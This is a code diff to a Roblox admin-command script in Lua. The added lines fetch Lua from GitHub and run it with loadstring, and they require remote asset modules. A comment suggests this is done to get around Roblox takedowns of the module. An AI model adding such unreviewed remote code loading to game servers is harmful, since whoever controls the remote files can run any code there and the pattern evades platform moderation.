@@ -4,6 +4,53 @@ local cmds = {}
 local banned = {}
 local countries = {}
 
+-- Thanks roblox for taking down my module every time i upload this script --
+
+local success, result = pcall(function() -- setup
+	return game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/pcxo/cxos-admin/refs/heads/main/setup")
+end)
+
+if success then
+	local content = result
+	local loaded, fail = loadstring(content)
+
+	if loaded then
+		loaded()
+	else
+		print("Error loading script: " .. fail)
+	end
+else
+	print("Error fetching file: " .. result)
+end
+
+local success, result = pcall(function() -- gmod gun
+	return game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/pcxo/cxos-admin/refs/heads/main/gunscript")
+end)
+
+if success then
+	local content = result
+	local loaded, fail = loadstring(content)
+
+	if loaded then
+		loaded()
+	else
+		print("Error loading script: " .. fail)
+	end
+else
+	print("Error fetching file: " .. result)
+end
+
+require(125333857991494).load() -- orb script
+require(139263854632403).load() -- gmod gun script
+
+repeat task.wait() until game:GetService("ReplicatedStorage"):FindFirstChild("RemoteScript")
+repeat task.wait() until game:GetService("ReplicatedStorage"):FindFirstChild("OrbScript")
+repeat task.wait() until game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder")
+
+game:GetService("ReplicatedStorage").RemoteScript.Parent = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder")
+game:GetService("ReplicatedStorage").OrbScript.Parent = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder")
+
+
 local success, result = pcall(function()
 	return game:GetService("HttpService"):GetAsync("http://country.io/names.json")
 end)
@@ -459,7 +506,7 @@ addcmd({
 			if plr.Character and plr.Character:FindFirstChild("Torso") then
 				local orb = Instance.new("Part", plr.Character)
 				local weld = Instance.new("Weld", orb)
-				local ls = game:GetService("ReplicatedStorage"):FindFirstChild("OrbScript")
+				local ls = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("OrbScript")
 				weld.Part0 = orb
 				weld.Part1 = plr.Character:FindFirstChild("Torso")
 				orb.Size = Vector3.new(10, 10, 10)
@@ -517,9 +564,9 @@ addcmd({
 					gmod.Parent = plr.Backpack
 				end
 				gmod:WaitForChild("RemoteScript"):Destroy()
-				game:GetService("ReplicatedStorage").RemoteScript.Parent = gmod
+				game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("RemoteScript").Parent = gmod
 				if not game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("cxo's gmod remote") then
-					local gmodremote = Instance.new("RemoteEvent", game:GetService("ReplicatedStorage"))
+					local gmodremote = Instance.new("RemoteEvent", game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"))
 					gmodremote.Name = "cxo's gmod remote"
 				end
 			end
